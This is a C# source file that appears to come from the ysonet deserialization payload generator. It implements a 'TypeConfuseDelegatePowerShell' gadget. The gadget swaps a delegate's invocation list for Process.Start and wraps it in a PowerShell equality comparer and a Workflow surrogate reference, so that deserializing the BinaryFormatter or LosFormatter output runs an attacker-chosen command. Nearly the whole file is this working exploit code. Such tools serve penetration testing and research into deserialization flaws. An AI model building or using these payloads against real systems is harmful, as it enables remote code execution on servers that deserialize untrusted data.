using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.Serialization;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegatePowerShell is deliberately separate from the
     * root-container variants of TypeConfuseDelegate. Those variants all carry an
     * IComparer<T> through an ordered tree. This graph instead reconstructs an
     * IEqualityComparer<string> supplied by Microsoft.PowerShell.Commands.Utility
     * and lets Dictionary<string,string>.OnDeserialization call it:
     *
     *   List<object>[0] -> Workflow ObjectSerializedRef
     *       -> FuncEqualityComparer<string>
     *          _comparer -> String.Equals, Process.Start
     *          _hash     -> empty List<string>.IndexOf (always -1 for these keys)
     *   List<object>[1] -> Dictionary<string,string>.OnDeserialization
     *       -> equal hashes -> comparer.Equals(executable, arguments)
     *
     * The outer list order and the Dictionary serialization record below are both
     * load-bearing. The comparer replacement must complete first, and the executable
     * key must be inserted before the arguments key so Process.Start receives its two
     * parameters in their semantic order.
     *
     * Every generation-only proxy writes a framework/application type identity into
     * SerializationInfo. No ysonet type survives on the wire, and the whole graph is
     * visible in this file.
     */
    public sealed class TypeConfuseDelegatePowerShellGenerator : GenericGenerator
    {
        private const string Mscorlib40 =
            "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string WorkflowAssembly =
            "System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, "
            + "PublicKeyToken=31bf3856ad364e35";
        private const string WorkflowObjectReference =
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+"
            + "ObjectSurrogate+ObjectSerializedRef";
        private const string WorkflowAppSettings =
            "System.Workflow.ComponentModel.AppSettings, " + WorkflowAssembly;
        private const string WorkflowTypeCheckSetting =
            "DisableActivitySurrogateSelectorTypeCheck";
        private const string PowerShellAssembly =
            "Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0, Culture=neutral, "
            + "PublicKeyToken=31bf3856ad364e35";
        private const string PowerShellComparer =
            "Microsoft.PowerShell.Commands.StringManipulation.FlashMeta.Utils."
            + "FuncEqualityComparer`1[[System.String, " + Mscorlib40 + "]]";

        private static readonly Func<string, string, bool> BenignEquality =
            new Func<string, string, bool>(String.Equals);

        public override bool SupportsLegacyFx()
        {
            return false;
        }

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.ExtraAssembly,
                    GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.NetFx481);
        }

        public override string Finders()
        {
            return "James Forshaw, Soroush Dalili";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Requires Microsoft.PowerShell.Commands.Utility, Version=3.0.0.0 "
                + "on the target and the application setting "
                + "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck=true. "
                + "That setting is mandatory on current serviced .NET Framework and cannot "
                + "be armed by another object in the same graph before Workflow resolves the "
                + "comparer. The measured target is .NET Framework 4.8.1; older Framework "
                + "versions are not claimed. The graph needs two distinct command fields, so "
                + "a one-part --rawcmd value is refused. Local --test runs only when Workflow's "
                + "effective setting is already true in this process.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // BinaryFormatter and LosFormatter each have an isolated raw/minified effect
        // cell with the required application config. SoapFormatter cannot author this
        // closed-generic graph, and NetDataContractSerializer does not reproduce the
        // ObjectSerializedRef member contract. Public-member serializers cannot recreate
        // either the multicast delegate invocation list or the IObjectReference fixup.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter,
                Formatters.LosFormatter,
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null)
                throw new ArgumentNullException("inputArgs");
            if (!IsSupported(formatter))
                throw new NotSupportedException(formatter + " is not supported by "
                    + Name() + ".");
            if (inputArgs.Test && !WorkflowAllowsEqualityComparer())
                throw new NotSupportedException(Name() + " cannot use local --test while "
                    + "Workflow's effective microsoft:WorkflowComponentModel:"
                    + "DisableActivitySurrogateSelectorTypeCheck setting is not true. Set it to "
                    + "true in the application config before starting this process, or first "
                    + "self-test ActivitySurrogateDisableTypeCheck in the same interactive "
                    + "session. Either variant retains the setting for follow-on tests; "
                    + "variant 1 verifies its payload in a safety child first. The process "
                    + "must also have "
                    + PowerShellAssembly + ".");

            InputArgs targetArgs = inputArgs.DeepCopy();
            ReadCommandFromFile(targetArgs);

            string executable = targetArgs.CmdFileName;
            if (!targetArgs.HasArguments)
                throw new ArgumentException(Name() + " requires a command that splits into "
                    + "an executable and an argument string. Supply both fields (for example "
                    + "--rawcmd -c \"program.exe argument\"); a one-part command cannot "
                    + "populate the two Dictionary keys that trigger equality.");
            string arguments = targetArgs.CmdArguments;
            if (String.Equals(executable, arguments, StringComparison.Ordinal))
                throw new ArgumentException(Name() + " requires distinct executable and "
                    + "argument strings (got \"" + executable + "\" twice). Equal keys "
                    + "collapse to one Dictionary entry and never invoke equality during "
                    + "deserialization.");

            Func<string, string, bool> confusedEquality = BuildConfusedEquality();
            EqualityComparerProxy comparer = new EqualityComparerProxy(confusedEquality);

            // The proxy is deliberately first. Dictionary.OnDeserialization must see the
            // completed ObjectSerializedRef replacement, not the generation-time proxy.
            List<object> root = new List<object>();
            root.Add(comparer);
            root.Add(new DictionaryMarshal(comparer, executable, arguments));
            return Serialize(root, formatter, targetArgs);
        }

        // Read Workflow's effective value, not only ConfigurationManager.AppSettings.
        // The internal property runs Workflow's one-time settings load and also applies
        // its dynamic-code-policy check. ActivitySurrogateDisableTypeCheck variant 2 sets
        // the same backing field in-process; variant 1 tests in a safety child and then
        // mirrors that state into the interactive parent. A later self-test therefore sees
        // the state that the target-side check will actually use.
        private static bool WorkflowAllowsEqualityComparer()
        {
            try
            {
                Type appSettings = Type.GetType(WorkflowAppSettings, false);
                if (appSettings == null) return false;
                PropertyInfo property = appSettings.GetProperty(WorkflowTypeCheckSetting,
                    BindingFlags.Static | BindingFlags.NonPublic);
                return property != null && property.PropertyType == typeof(bool)
                    && (bool)property.GetValue(null, null);
            }
            catch
            {
                return false;
            }
        }

        private static void ReadCommandFromFile(InputArgs inputArgs)
        {
            string contents = inputArgs.CmdFromFile;
            if (!String.IsNullOrEmpty(contents))
                inputArgs.Cmd = contents;
        }

        private static Func<string, string, bool> BuildConfusedEquality()
        {
            Func<string, string, bool> confused =
                (Func<string, string, bool>)Delegate.Combine(
                    BenignEquality, BenignEquality);
            FieldInfo invocationList = typeof(MulticastDelegate).GetField(
                "_invocationList", BindingFlags.Instance | BindingFlags.NonPublic);
            if (invocationList == null)
                throw new SerializationException(
                    "MulticastDelegate._invocationList is unavailable on this runtime.");

            object[] entries = confused.GetInvocationList();
            entries[1] = new Func<string, string, Process>(Process.Start);
            invocationList.SetValue(confused, entries);
            return confused;
        }

        private static void SetWireType(SerializationInfo info,
            string fullTypeName, string assemblyName)
        {
            info.FullTypeName = fullTypeName;
            info.AssemblyName = assemblyName;
        }

        [Serializable]
        private sealed class EqualityComparerProxy : IEqualityComparer<string>, ISerializable
        {
            private readonly Func<string, string, bool> serializedEquality;

            internal EqualityComparerProxy(Func<string, string, bool> serializedEquality)
            {
                if (serializedEquality == null)
                    throw new ArgumentNullException("serializedEquality");
                this.serializedEquality = serializedEquality;
            }

            private EqualityComparerProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only equality-comparer proxy is never deserialized.");
            }

            public bool Equals(string left, string right)
            {
                return String.Equals(left, right, StringComparison.Ordinal);
            }

            public int GetHashCode(string value)
            {
                return value == null ? 0 : value.GetHashCode();
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetWireType(info, WorkflowObjectReference, WorkflowAssembly);
                info.AddValue("type", new SerializedTypeProxy(
                    PowerShellComparer, PowerShellAssembly), typeof(Type));

                // FormatterServicesNoSerializableCheck returns the PowerShell type's
                // two instance fields in this measured order: _comparer, then _hash.
                info.AddValue("memberDatas", new object[]
                {
                    serializedEquality,
                    // The empty list is serializable and its closed delegate returns -1
                    // for every non-null command string, forcing the second insertion
                    // into the first key's Dictionary bucket.
                    new Func<string, int>(new List<string>().IndexOf),
                });
            }
        }

        [Serializable]
        private sealed class SerializedTypeProxy : ISerializable
        {
            private readonly string fullTypeName;
            private readonly string assemblyName;

            internal SerializedTypeProxy(string fullTypeName, string assemblyName)
            {
                this.fullTypeName = fullTypeName;
                this.assemblyName = assemblyName;
            }

            private SerializedTypeProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only type proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetWireType(info, "System.UnitySerializationHolder", Mscorlib40);
                info.AddValue("Data", fullTypeName);
                info.AddValue("UnityType", 4);
                info.AddValue("AssemblyName", assemblyName);
            }
        }

        [Serializable]
        private sealed class DictionaryMarshal : ISerializable
        {
            private readonly IEqualityComparer<string> comparer;
            private readonly KeyValuePair<string, string>[] pairs;

            internal DictionaryMarshal(IEqualityComparer<string> comparer,
                string executable, string arguments)
            {
                this.comparer = comparer;
                pairs = new KeyValuePair<string, string>[]
                {
                    new KeyValuePair<string, string>(executable, "executable"),
                    new KeyValuePair<string, string>(arguments, "arguments"),
                };
            }

            private DictionaryMarshal(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only Dictionary marshal is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(Dictionary<string, string>));
                info.AddValue("Version", 2);
                info.AddValue("Comparer", comparer, typeof(IEqualityComparer<string>));
                info.AddValue("HashSize", 3);
                info.AddValue("KeyValuePairs", pairs,
                    typeof(KeyValuePair<string, string>[]));
            }
        }
    }
}
